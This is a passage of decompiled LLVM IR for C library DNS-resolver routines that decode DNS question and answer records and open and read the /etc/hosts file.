  %v0_1000f58c = load i32, i32* @r30, align 4
  %v2_1000f58c = add i32 %v0_1000f58c, %v2_1000f578
  store i32 %v2_1000f58c, i32* %r9.global-to-local, align 4
  br i1 %v2_1000f584, label %dec_label_pc_1000f59c, label %dec_label_pc_1000f594

dec_label_pc_1000f594:                            ; preds = %dec_label_pc_1000f58c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f5c0

dec_label_pc_1000f59c:                            ; preds = %dec_label_pc_1000f58c
  %v0_1000f59c = load i32, i32* @r31, align 4
  %v1_1000f59c = add i32 %v0_1000f59c, 6
  %v2_1000f59c = inttoptr i32 %v1_1000f59c to i8*
  %v3_1000f59c = load i8, i8* %v2_1000f59c, align 1
  %v5_1000f5a0 = inttoptr i32 %v2_1000f58c to i8*
  store i8 %v3_1000f59c, i8* %v5_1000f5a0, align 1
  %v0_1000f5a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f5a4 = add i32 %v0_1000f5a4, 4
  store i32 %v1_1000f5a4, i32* %r3.global-to-local, align 4
  %v0_1000f5a8 = load i32, i32* @r31, align 4
  %v1_1000f5a8 = add i32 %v0_1000f5a8, 4
  %v2_1000f5a8 = inttoptr i32 %v1_1000f5a8 to i32*
  %v3_1000f5a8 = load i32, i32* %v2_1000f5a8, align 4
  %v1_1000f5ac = trunc i32 %v3_1000f5a8 to i8
  %v2_1000f5ac = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f5ac = add i32 %v2_1000f5ac, 1
  %v4_1000f5ac = inttoptr i32 %v3_1000f5ac to i8*
  store i8 %v1_1000f5ac, i8* %v4_1000f5ac, align 1
  %v0_1000f5b0 = load i32, i32* @r31, align 4
  %v1_1000f5b0 = add i32 %v0_1000f5b0, 10
  %v2_1000f5b0 = inttoptr i32 %v1_1000f5b0 to i8*
  %v3_1000f5b0 = load i8, i8* %v2_1000f5b0, align 1
  %v2_1000f5b4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f5b4 = add i32 %v2_1000f5b4, 2
  %v4_1000f5b4 = inttoptr i32 %v3_1000f5b4 to i8*
  store i8 %v3_1000f5b0, i8* %v4_1000f5b4, align 1
  %v0_1000f5b8 = load i32, i32* @r31, align 4
  %v1_1000f5b8 = add i32 %v0_1000f5b8, 8
  %v2_1000f5b8 = inttoptr i32 %v1_1000f5b8 to i32*
  %v3_1000f5b8 = load i32, i32* %v2_1000f5b8, align 4
  %v1_1000f5bc = trunc i32 %v3_1000f5b8 to i8
  %v2_1000f5bc = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f5bc = add i32 %v2_1000f5bc, 3
  %v4_1000f5bc = inttoptr i32 %v3_1000f5bc to i8*
  store i8 %v1_1000f5bc, i8* %v4_1000f5bc, align 1
  %v0_1000f5d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f5c0

dec_label_pc_1000f5c0:                            ; preds = %entry, %dec_label_pc_1000f594, %dec_label_pc_1000f59c
  %v0_1000f5d0 = phi i32 [ %v2_1000f578, %entry ], [ -1, %dec_label_pc_1000f594 ], [ %v0_1000f5d0.pre, %dec_label_pc_1000f59c ]
  ret i32 %v0_1000f5d0

; uselistorder directives
  uselistorder i32 %v2_1000f578, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000f5c0, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268498404, i32* @lr, align 4
  %v0_1000f5e0 = call i32 @__length_dotted()
  %v1_1000f5e4 = icmp slt i32 %v0_1000f5e0, 0
  br i1 %v1_1000f5e4, label %dec_label_pc_1000f5f0, label %dec_label_pc_1000f5ec

dec_label_pc_1000f5ec:                            ; preds = %entry
  %v1_1000f5ec = add i32 %v0_1000f5e0, 4
  br label %dec_label_pc_1000f5f0

dec_label_pc_1000f5f0:                            ; preds = %entry, %dec_label_pc_1000f5ec
  %v0_1000f5fc = phi i32 [ %v0_1000f5e0, %entry ], [ %v1_1000f5ec, %dec_label_pc_1000f5ec ]
  ret i32 %v0_1000f5fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000f5f0, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000f604 = load i32, i32* @lr, align 4
  store i32 %v0_1000f604, i32* %r0.global-to-local, align 4
  %v2_1000f60c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000f60c, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268498480, i32* @lr, align 4
  %v2_1000f62c = call i32 @__decode_dotted(i32 %v2_1000f60c, i32 256)
  store i32 %v2_1000f62c, i32* @r27, align 4
  %v1_1000f630 = icmp slt i32 %v2_1000f62c, 0
  %v0_1000f634 = load i32, i32* @r28, align 4
  %v2_1000f634 = add i32 %v0_1000f634, %v2_1000f62c
  store i32 %v2_1000f634, i32* @r28, align 4
  %v1_1000f638 = load i32, i32* @r29, align 4
  %v2_1000f638 = sub i32 %v1_1000f638, %v2_1000f634
  %v1_1000f63c = add i32 %v2_1000f638, -10
  br i1 %v1_1000f630, label %dec_label_pc_1000f6f8, label %dec_label_pc_1000f648

dec_label_pc_1000f648:                            ; preds = %entry
  %v0_1000f64c = load i32, i32* @r26, align 4
  %v2_1000f64c = add i32 %v0_1000f64c, %v2_1000f634
  store i32 %v2_1000f64c, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000f63c, -1
  br i1 %tmp6, label %dec_label_pc_1000f65c, label %dec_label_pc_1000f654

dec_label_pc_1000f654:                            ; preds = %dec_label_pc_1000f648
  store i32 %v1_1000f63c, i32* @r27, align 4
  br label %dec_label_pc_1000f6f8

dec_label_pc_1000f65c:                            ; preds = %dec_label_pc_1000f648
  store i32 268498528, i32* @lr, align 4
  %v1_1000f65c = call i32 @__GI_strdup(i32 %v2_1000f60c)
  %v0_1000f660 = load i32, i32* @r30, align 4
  %v1_1000f660 = add i32 %v0_1000f660, 2
  store i32 %v1_1000f660, i32* %r8.global-to-local, align 4
  %v1_1000f664 = load i32, i32* @r31, align 4
  %v2_1000f664 = inttoptr i32 %v1_1000f664 to i32*
  store i32 %v1_1000f65c, i32* %v2_1000f664, align 4
  %v0_1000f668 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f668 = add i32 %v0_1000f668, 2
  store i32 %v1_1000f668, i32* %r10.global-to-local, align 4
  %v0_1000f66c = load i32, i32* @r30, align 4
  %v1_1000f66c = add i32 %v0_1000f66c, 10
  store i32 %v1_1000f66c, i32* %r6.global-to-local, align 4
  %v0_1000f670 = load i32, i32* @r26, align 4
  %v1_1000f670 = load i32, i32* @r28, align 4
  %v2_1000f670 = add i32 %v1_1000f670, %v0_1000f670
  %v3_1000f670 = inttoptr i32 %v2_1000f670 to i8*
  %v4_1000f670 = load i8, i8* %v3_1000f670, align 1
  %v5_1000f670 = zext i8 %v4_1000f670 to i32
  store i32 %v5_1000f670, i32* %r0.global-to-local, align 4
  %v1_1000f674 = add i32 %v0_1000f66c, 1
  %v2_1000f674 = inttoptr i32 %v1_1000f674 to i8*
  %v3_1000f674 = load i8, i8* %v2_1000f674, align 1
  %v4_1000f674 = zext i8 %v3_1000f674 to i32
  store i32 %v4_1000f674, i32* %r9.global-to-local, align 4
  %v1_1000f678 = mul nuw nsw i32 %v5_1000f670, 256
  %v2_1000f67c = or i32 %v4_1000f674, %v1_1000f678
  store i32 %v2_1000f67c, i32* %r0.global-to-local, align 4
  %v1_1000f680 = load i32, i32* @r31, align 4
  %v2_1000f680 = add i32 %v1_1000f680, 4
  %v3_1000f680 = inttoptr i32 %v2_1000f680 to i32*
  store i32 %v2_1000f67c, i32* %v3_1000f680, align 4
  %v0_1000f684 = load i32, i32* @r30, align 4
  %v1_1000f684 = add i32 %v0_1000f684, 2
  %v2_1000f684 = inttoptr i32 %v1_1000f684 to i8*
  %v3_1000f684 = load i8, i8* %v2_1000f684, align 1
  %v4_1000f684 = zext i8 %v3_1000f684 to i32
  store i32 %v4_1000f684, i32* %r0.global-to-local, align 4
  %v0_1000f688 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f688 = add i32 %v0_1000f688, 1
  %v2_1000f688 = inttoptr i32 %v1_1000f688 to i8*
  %v3_1000f688 = load i8, i8* %v2_1000f688, align 1
  %v4_1000f688 = zext i8 %v3_1000f688 to i32
  store i32 %v4_1000f688, i32* %r9.global-to-local, align 4
  %v1_1000f68c = mul nuw nsw i32 %v4_1000f684, 256
  %v2_1000f690 = or i32 %v4_1000f688, %v1_1000f68c
  store i32 %v2_1000f690, i32* %r0.global-to-local, align 4
  %v1_1000f694 = load i32, i32* @r31, align 4
  %v2_1000f694 = add i32 %v1_1000f694, 8
  %v3_1000f694 = inttoptr i32 %v2_1000f694 to i32*
  store i32 %v2_1000f690, i32* %v3_1000f694, align 4
  %v0_1000f698 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f698 = add i32 %v0_1000f698, 2
  %v2_1000f698 = inttoptr i32 %v1_1000f698 to i8*
  %v3_1000f698 = load i8, i8* %v2_1000f698, align 1
  %v4_1000f698 = zext i8 %v3_1000f698 to i32
  store i32 %v4_1000f698, i32* %r0.global-to-local, align 4
  %v0_1000f69c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f69c = add i32 %v0_1000f69c, 1
  %v2_1000f69c = inttoptr i32 %v1_1000f69c to i8*
  %v3_1000f69c = load i8, i8* %v2_1000f69c, align 1
  %v4_1000f69c = zext i8 %v3_1000f69c to i32
  store i32 %v4_1000f69c, i32* %r11.global-to-local, align 4
  %v1_1000f6a0 = add i32 %v0_1000f69c, 3
  %v2_1000f6a0 = inttoptr i32 %v1_1000f6a0 to i8*
  %v3_1000f6a0 = load i8, i8* %v2_1000f6a0, align 1
  %v4_1000f6a0 = zext i8 %v3_1000f6a0 to i32
  %v1_1000f6a4 = mul nuw i32 %v4_1000f698, 16777216
  store i32 %v1_1000f6a4, i32* %r0.global-to-local, align 4
  %v1_1000f6a8 = add i32 %v0_1000f69c, 2
  %v2_1000f6a8 = inttoptr i32 %v1_1000f6a8 to i8*
  %v3_1000f6a8 = load i8, i8* %v2_1000f6a8, align 1
  %v4_1000f6a8 = zext i8 %v3_1000f6a8 to i32
  %v1_1000f6ac = mul nuw nsw i32 %v4_1000f69c, 65536
  %v2_1000f6b0 = or i32 %v1_1000f6ac, %v1_1000f6a4
  %v0_1000f6b4 = load i32, i32* @r28, align 4
  %v1_1000f6b4 = add i32 %v0_1000f6b4, 10
  store i32 %v1_1000f6b4, i32* %r11.global-to-local, align 4
  %v2_1000f6b8 = or i32 %v2_1000f6b0, %v4_1000f6a0
  store i32 %v2_1000f6b8, i32* %r0.global-to-local, align 4
  %v1_1000f6bc = mul nuw nsw i32 %v4_1000f6a8, 256
  %v2_1000f6c0 = or i32 %v1_1000f6bc, %v2_1000f6b8
  store i32 %v2_1000f6c0, i32* %r9.global-to-local, align 4
  %v1_1000f6c4 = load i32, i32* @r31, align 4
  %v2_1000f6c4 = add i32 %v1_1000f6c4, 12
  %v3_1000f6c4 = inttoptr i32 %v2_1000f6c4 to i32*
  store i32 %v2_1000f6c0, i32* %v3_1000f6c4, align 4
  %v0_1000f6c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f6c8 = add i32 %v0_1000f6c8, 6
  %v2_1000f6c8 = inttoptr i32 %v1_1000f6c8 to i8*
  %v3_1000f6c8 = load i8, i8* %v2_1000f6c8, align 1
  %v4_1000f6c8 = zext i8 %v3_1000f6c8 to i32
  store i32 %v4_1000f6c8, i32* %r9.global-to-local, align 4
  %v0_1000f6cc = load i32, i32* @r30, align 4
  %v1_1000f6cc = add i32 %v0_1000f6cc, 9
  %v2_1000f6cc = inttoptr i32 %v1_1000f6cc to i8*
  %v3_1000f6cc = load i8, i8* %v2_1000f6cc, align 1
  %v4_1000f6cc = zext i8 %v3_1000f6cc to i32
  store i32 %v4_1000f6cc, i32* %r0.global-to-local, align 4
  %v1_1000f6d0 = mul nuw nsw i32 %v4_1000f6c8, 256
  store i32 %v1_1000f6d0, i32* %r9.global-to-local, align 4
  %v0_1000f6d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f6d4 = load i32, i32* @r31, align 4
  %v2_1000f6d4 = add i32 %v1_1000f6d4, 24
  %v3_1000f6d4 = inttoptr i32 %v2_1000f6d4 to i32*
  store i32 %v0_1000f6d4, i32* %v3_1000f6d4, align 4
  %v0_1000f6d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f6d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f6d8 = or i32 %v1_1000f6d8, %v0_1000f6d8
  store i32 %v2_1000f6d8, i32* %r9.global-to-local, align 4
  %v0_1000f6dc = load i32, i32* %r6.global-to-local, align 4
  %v1_1000f6dc = load i32, i32* @r31, align 4
  %v2_1000f6dc = add i32 %v1_1000f6dc, 20
  %v3_1000f6dc = inttoptr i32 %v2_1000f6dc to i32*
  store i32 %v0_1000f6dc, i32* %v3_1000f6dc, align 4
  %v0_1000f6e0 = load i32, i32* @r29, align 4
  %v1_1000f6e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f6e0 = icmp slt i32 %v0_1000f6e0, %v1_1000f6e0
  %v1_1000f6e4 = add i32 %v1_1000f6e0, 10
  store i32 %v1_1000f6e4, i32* %r0.global-to-local, align 4
  %v0_1000f6e8 = load i32, i32* @r27, align 4
  %v2_1000f6e8 = add i32 %v0_1000f6e8, %v1_1000f6e4
  store i32 %v2_1000f6e8, i32* @r27, align 4
  %v1_1000f6ec = load i32, i32* @r31, align 4
  %v2_1000f6ec = add i32 %v1_1000f6ec, 16
  %v3_1000f6ec = inttoptr i32 %v2_1000f6ec to i32*
  store i32 %v1_1000f6e0, i32* %v3_1000f6ec, align 4
  br i1 %v2_1000f6e0, label %dec_label_pc_1000f6f4, label %dec_label_pc_1000f65c.dec_label_pc_1000f6f8_crit_edge

dec_label_pc_1000f65c.dec_label_pc_1000f6f8_crit_edge: ; preds = %dec_label_pc_1000f65c
  %v0_1000f6fc.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000f6f8

dec_label_pc_1000f6f4:                            ; preds = %dec_label_pc_1000f65c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000f6f8

dec_label_pc_1000f6f8:                            ; preds = %dec_label_pc_1000f65c.dec_label_pc_1000f6f8_crit_edge, %entry, %dec_label_pc_1000f654, %dec_label_pc_1000f6f4
  %v0_1000f6fc = phi i32 [ %v0_1000f6fc.pre, %dec_label_pc_1000f65c.dec_label_pc_1000f6f8_crit_edge ], [ %v2_1000f62c, %entry ], [ %v1_1000f63c, %dec_label_pc_1000f654 ], [ -1, %dec_label_pc_1000f6f4 ]
  store i32 %v0_1000f604, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f6fc

; uselistorder directives
  uselistorder i32 %v1_1000f6e0, { 1, 0, 2 }
  uselistorder i32 %v1_1000f6a4, { 1, 0 }
  uselistorder i32 %v1_1000f63c, { 1, 2, 0 }
  uselistorder i32 %v2_1000f62c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f60c, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 29, 30, 31, 32, 1, 14, 33, 34, 15, 16, 17, 18, 5, 6, 27, 7, 0, 38, 39, 19, 20, 21, 22, 23, 25, 26, 24, 37, 35, 8, 9, 10, 11, 12, 13, 4, 28, 2, 3, 36 }
  uselistorder i32 9, { 17, 18, 19, 20, 1, 8, 2, 9, 3, 10, 0, 11, 12, 13, 14, 15, 4, 5, 6, 7, 16, 21, 22 }
  uselistorder i32 65536, { 0, 34, 1, 2, 3, 4, 6, 5, 7, 8, 9, 37, 35, 10, 12, 11, 13, 36, 14, 16, 15, 17, 19, 18, 20, 21, 22, 25, 24, 23, 27, 28, 26, 29, 31, 32, 30, 33 }
  uselistorder i32 3, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 35, 2, 0, 8, 18, 20, 19, 10, 21, 52, 9, 57, 3, 53, 54, 36, 37, 22, 38, 39, 30, 32, 58, 59, 31, 62, 33, 14, 4, 5, 55, 60, 61, 6, 67, 68, 69, 63, 64, 65, 66, 12, 41, 40, 51, 7, 13, 34, 15, 23, 16, 24, 25, 56, 26, 27, 28, 17, 29, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_1000f6f8, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1000f714 = load i32, i32* @lr, align 4
  store i32 268498744, i32* @lr, align 4
  %v3_1000f734 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10013970.695 to i32), i32 ptrtoint (i32* @global_var_1001390c.665 to i32))
  %v3_1000f73c = icmp eq i32 %v3_1000f734, 0
  br i1 %v3_1000f73c, label %dec_label_pc_1000f744, label %dec_label_pc_1000f760

dec_label_pc_1000f744:                            ; preds = %entry
  %v0_1000f738 = load i32, i32* @r29, align 4
  store i32 %v0_1000f714, i32* @lr, align 4
  %v3_1000f75c = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001397c.696 to i32), i32 %v0_1000f738)
  br label %dec_label_pc_1000f760

dec_label_pc_1000f760:                            ; preds = %entry, %dec_label_pc_1000f744
  %v0_1000f770 = phi i32 [ %v3_1000f734, %entry ], [ %v3_1000f75c, %dec_label_pc_1000f744 ]
  ret i32 %v0_1000f770

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_1000f760, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000f774 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000f788 = sub i32 0, %arg6
  %v1_1000f78c = urem i32 %v1_1000f788, 4
  store i32 %v1_1000f78c, i32* %r0.global-to-local, align 4
  %v3_1000f78c = icmp eq i32 %v1_1000f78c, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000f7a4 = load i32, i32* @r10, align 4
  store i32 %v0_1000f7a4, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000f7c0.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000f78c, label %dec_label_pc_1000f7c0, label %dec_label_pc_1000f7b0

dec_label_pc_1000f7b0:                            ; preds = %entry
  %v2_1000f7b0 = icmp ult i32 %v0_1000f7c0.pr, %v1_1000f78c
  br i1 %v2_1000f7b0, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f7b8

dec_label_pc_1000f7b8:                            ; preds = %dec_label_pc_1000f7b0
  %v2_1000f7b8 = sub i32 %v0_1000f7c0.pr, %v1_1000f78c
  store i32 %v2_1000f7b8, i32* %r9.global-to-local, align 4
  %v2_1000f7bc = add i32 %v1_1000f78c, %arg6
  store i32 %v2_1000f7bc, i32* @r30, align 4
  br label %dec_label_pc_1000f7c0

dec_label_pc_1000f7c0:                            ; preds = %entry, %dec_label_pc_1000f7b8
  %v0_1000f7cc = phi i32 [ %v2_1000f7bc, %dec_label_pc_1000f7b8 ], [ %arg6, %entry ]
  %v0_1000f7d0 = phi i32 [ %v2_1000f7b8, %dec_label_pc_1000f7b8 ], [ %v0_1000f7c0.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1000f7d0, 32
  br i1 %tmp49, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f7c8

dec_label_pc_1000f7c8:                            ; preds = %dec_label_pc_1000f7c0
  %v3_1000f7c8 = icmp eq i32 %arg4, 1
  %v1_1000f7cc = add i32 %v0_1000f7cc, 32
  store i32 %v1_1000f7cc, i32* @r24, align 4
  %v1_1000f7d0 = add i32 %v0_1000f7d0, -32
  store i32 %v1_1000f7d0, i32* @r27, align 4
  br i1 %v3_1000f7c8, label %dec_label_pc_1000f8d0, label %dec_label_pc_1000f7d8

dec_label_pc_1000f7d8:                            ; preds = %dec_label_pc_1000f7c8
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000f7e0 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000f7e0, align 4
  %tmp50 = icmp ult i32 %v1_1000f7d0, 4
  br i1 %tmp50, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7e8:                            ; preds = %dec_label_pc_1000f7d8
  %v0_1000f7e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f7e8 = add i32 %v0_1000f7e8, -36
  store i32 %v1_1000f7e8, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000f7e8, 8
  br i1 %tmp51, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f7f4

dec_label_pc_1000f7f4:                            ; preds = %dec_label_pc_1000f7e8
  %v0_1000f7f4 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000f7f4, 16
  br i1 %tmp52, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f7fc

dec_label_pc_1000f7fc:                            ; preds = %dec_label_pc_1000f7f4
  %v1_1000f7fc = add i32 %v0_1000f7e8, -48
  store i32 %v1_1000f7fc, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000f7fc, 8
  br i1 %tmp53, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f808

dec_label_pc_1000f808:                            ; preds = %dec_label_pc_1000f7fc
  %v1_1000f808 = add i32 %v0_1000f7e8, -56
  store i32 %v1_1000f808, i32* %r0.global-to-local, align 4
  %v1_1000f80c = add i32 %v0_1000f7e8, -44
  store i32 %v1_1000f80c, i32* @r27, align 4
  %v3_1000f810 = icmp ugt i32 %v1_1000f808, %v1_1000f80c
  %v0_1000f814 = load i32, i32* @r30, align 4
  %v1_1000f814 = add i32 %v0_1000f814, 36
  store i32 %v1_1000f814, i32* @r29, align 4
  %v1_1000f818 = add i32 %v0_1000f814, 48
  store i32 %v1_1000f818, i32* @r26, align 4
  br i1 %v3_1000f810, label %dec_label_pc_1000f82c, label %dec_label_pc_1000f824

dec_label_pc_1000f824:                            ; preds = %dec_label_pc_1000f808
  store i32 %v1_1000f808, i32* @r27, align 4
  br label %dec_label_pc_1000f82c

dec_label_pc_1000f82c:                            ; preds = %dec_label_pc_1000f808, %dec_label_pc_1000f824
  %v0_1000f82c = phi i32 [ %v1_1000f808, %dec_label_pc_1000f824 ], [ %v1_1000f80c, %dec_label_pc_1000f808 ]
  %tmp54 = icmp ult i32 %v0_1000f82c, 80
  br i1 %tmp54, label %dec_label_pc_1000fa74, label %dec_label_pc_1000f834

dec_label_pc_1000f834:                            ; preds = %dec_label_pc_1000f82c
  store i32 268499000, i32* @lr, align 4
  %v0_1000f834 = call i32 @__open_etc_hosts()
  store i32 %v0_1000f834, i32* @r20, align 4
  %v3_1000f838 = icmp eq i32 %v0_1000f834, 0
  br i1 %v3_1000f838, label %dec_label_pc_1000f858, label %dec_label_pc_1000f840

dec_label_pc_1000f840:                            ; preds = %dec_label_pc_1000f834
  %v0_1000f840 = load i32, i32* @r24, align 4
  store i32 %v0_1000f840, i32* @r25, align 4
  %v0_1000f848 = load i32, i32* @r26, align 4
  store i32 %v0_1000f848, i32* @r23, align 4
  %v0_1000f84c = load i32, i32* @r31, align 4
  store i32 %v0_1000f84c, i32* @r24, align 4
  store i32 %v0_1000f840, i32* %r21.global-to-local, align 4
  %v1_1000f8e8.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000f8e0

dec_label_pc_1000f858:                            ; preds = %dec_label_pc_1000f834
  %v1_1000f858 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f858 = inttoptr i32 %v1_1000f858 to i32*
  store i32 0, i32* %v2_1000f858, align 4
  %v0_1000f85c = call i32 @__errno_location()
  %v1_1000f860 = inttoptr i32 %v0_1000f85c to i32*
  %v2_1000f860 = load i32, i32* %v1_1000f860, align 4
  store i32 %v2_1000f860, i32* @r26, align 4
  br label %dec_label_pc_1000fa78

dec_label_pc_1000f868:                            ; preds = %dec_label_pc_1000fa08
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f86c = load i32, i32* @r25, align 4
  %v1_1000f86c = load i32, i32* @r22, align 4
  %v2_1000f86c = inttoptr i32 %v1_1000f86c to i32*
  store i32 %v0_1000f86c, i32* %v2_1000f86c, align 4
  %v0_1000f870 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f870 = load i32, i32* @r22, align 4
  %v2_1000f870 = add i32 %v1_1000f870, 4
  %v3_1000f870 = inttoptr i32 %v2_1000f870 to i32*
  store i32 %v0_1000f870, i32* %v3_1000f870, align 4
  %v0_1000f874 = load i32, i32* @r30, align 4
  %v1_1000f874 = add i32 %v0_1000f874, 8
  store i32 %v1_1000f874, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f87c = add i32 %v0_1000f874, 4
  %v2_1000f87c = inttoptr i32 %v1_1000f87c to i32*
  %v3_1000f87c = load i32, i32* %v2_1000f87c, align 4
  store i32 %v3_1000f87c, i32* %r0.global-to-local, align 4
  %v0_1000f880 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f880 = load i32, i32* @r28, align 4
  %v2_1000f880 = add i32 %v1_1000f880, 8
  %v3_1000f880 = inttoptr i32 %v2_1000f880 to i32*
  store i32 %v0_1000f880, i32* %v3_1000f880, align 4
  %v0_1000f884 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f884 = load i32, i32* @r28, align 4
  %v2_1000f884 = inttoptr i32 %v1_1000f884 to i32*
  store i32 %v0_1000f884, i32* %v2_1000f884, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000f88c = load i32, i32* @r28, align 4
  %v2_1000f88c = add i32 %v1_1000f88c, 12
  %v3_1000f88c = inttoptr i32 %v2_1000f88c to i32*
  store i32 4, i32* %v3_1000f88c, align 4
  %v0_1000f890 = load i32, i32* @r22, align 4
  %v1_1000f890 = load i32, i32* @r28, align 4
  %v2_1000f890 = add i32 %v1_1000f890, 16
  %v3_1000f890 = inttoptr i32 %v2_1000f890 to i32*
  store i32 %v0_1000f890, i32* %v3_1000f890, align 4
  br label %dec_label_pc_1000f8c4

dec_label_pc_1000f898:                            ; preds = %dec_label_pc_1000fa2c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f89c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000f89c = load i32, i32* @r23, align 4
  %v2_1000f89c = inttoptr i32 %v1_1000f89c to i32*
  store i32 %v0_1000f89c, i32* %v2_1000f89c, align 4
  %v0_1000f8a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f8a0 = load i32, i32* @r23, align 4
  %v2_1000f8a0 = add i32 %v1_1000f8a0, 4
  %v3_1000f8a0 = inttoptr i32 %v2_1000f8a0 to i32*
  store i32 %v0_1000f8a0, i32* %v3_1000f8a0, align 4
  %v0_1000f8a4 = load i32, i32* @r30, align 4
  %v1_1000f8a4 = add i32 %v0_1000f8a4, 8
  store i32 %v1_1000f8a4, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f8ac = add i32 %v0_1000f8a4, 4
  %v2_1000f8ac = inttoptr i32 %v1_1000f8ac to i32*
  %v3_1000f8ac = load i32, i32* %v2_1000f8ac, align 4
  store i32 %v3_1000f8ac, i32* %r0.global-to-local, align 4
  %v0_1000f8b0 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f8b0 = load i32, i32* @r28, align 4
  %v2_1000f8b0 = add i32 %v1_1000f8b0, 8
  %v3_1000f8b0 = inttoptr i32 %v2_1000f8b0 to i32*
